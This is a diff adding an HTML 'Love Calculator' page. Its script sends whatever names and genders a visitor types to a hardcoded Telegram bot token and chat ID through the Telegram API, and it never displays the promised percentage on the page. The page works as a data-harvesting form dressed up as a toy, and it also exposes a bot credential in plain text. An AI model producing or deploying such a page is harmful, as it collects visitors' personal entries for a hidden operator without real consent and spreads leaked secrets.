@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Calculator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        .container {
+            display: inline-block;
+            padding: 20px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+        }
+        .button {
+            background-color: green;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Find Love % Between</h2>
+    <div class="container">
+        <div>
+            <label>Your Name</label><br>
+            <input type="text" id="yourName" placeholder="Enter Your Name">
+            <br>
+            <input type="radio" name="yourGender" value="Male" checked> Male
+            <input type="radio" name="yourGender" value="Female"> Female
+        </div>
+        <br>
+        <div>
+            <label>Partner's Name</label><br>
+            <input type="text" id="partnerName" placeholder="Enter Partner's Name">
+            <br>
+            <input type="radio" name="partnerGender" value="Male"> Male
+            <input type="radio" name="partnerGender" value="Female" checked> Female
+        </div>
+        <br>
+        <button class="button" onclick="sendToTelegram()">Calculate Love %</button>
+    </div>
+    <script>
+        function sendToTelegram() {
+            const botToken = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+            const chatId = "6524755764";
+            
+            let yourName = document.getElementById("yourName").value;
+            let partnerName = document.getElementById("partnerName").value;
+            let yourGender = document.querySelector('input[name="yourGender"]:checked').value;
+            let partnerGender = document.querySelector('input[name="partnerGender"]:checked').value;
+            let lovePercentage = Math.floor(Math.random() * 100) + 1;
+            
+            let message = `❤️ Love Calculator ❤️\n\n` +
+                `Your Name: ${yourName} (${yourGender})\n` +
+                `Partner's Name: ${partnerName} (${partnerGender})\n` +
+                `Love Percentage: ${lovePercentage}%`;
+            
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    alert("Love % sent to Telegram!");
+                })
+                .catch(error => {
+                    alert("Failed to send data!");
+                    console.error("Error:", error);
+                });
+        }
+    </script>
+</body>
+</html>
